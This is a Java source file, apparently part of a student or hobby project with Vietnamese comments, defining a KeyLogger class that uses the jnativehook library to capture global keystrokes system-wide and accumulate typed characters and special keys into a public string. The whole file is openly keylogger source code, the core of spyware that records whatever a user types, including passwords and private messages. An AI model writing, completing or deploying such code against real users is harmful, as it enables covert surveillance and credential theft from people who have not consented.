/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template
 */

package com.mycompany.server;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.security.Key;

/**
 *
 * @author FPT SHOP
 */
public class KeyLogger implements NativeKeyListener {

    //biến data để lưu key
    public String data = "";

    public void nativeKeyPressed(NativeKeyEvent e) {
        
        // Lấy keycCode trong thư viện
        int get_keyCode = e.getKeyCode();
        
        // Biến keyValue lưu phím
        String keyValue = "";
        
        switch (get_keyCode){
            case 42:    
            case 29:    
            case 56:    
            case 69:    
            case 59:    
            case 60:    
            case 61:   
            case 62:   
            case 63:    
            case 64:    
            case 65:    
            case 66:    
            case 67:    
            case 68:   
            case 87:    
            case 88:      
            case 15:    
            case 58:    
            case 3667:  
            case 3666:  
            case 3655:  
            case 3653:  
            case 3663:  
            case 3657: 
            case 3665:  
            case 57416: 
            case 57419: 
            case 57421:
            case 57424: 
                keyValue = NativeKeyEvent.getKeyText(get_keyCode);
                data += keyValue;
                break; 
            case 53:    
            case 52:    
            case 3658:  
            case 3662:  
                break; 
            default:
                keyValue = NativeKeyEvent.getKeyText(get_keyCode);
                break;
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
        
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e){
        String keyVal = "";

        char get_char = e.getKeyChar();
        int c1 = get_char;
        
        // Cài lại phím
        if (c1 == 13){
            keyVal += "Enter";
        }
        else if(c1 == 8){ 
            keyVal += "Backspace";
        }
        else if(c1 == 27){
            keyVal += "Escape";
        }
        else{
            keyVal += get_char;
        }
        
        data += keyVal;
//        System.out.println("Typed: "+ data);

    }
}
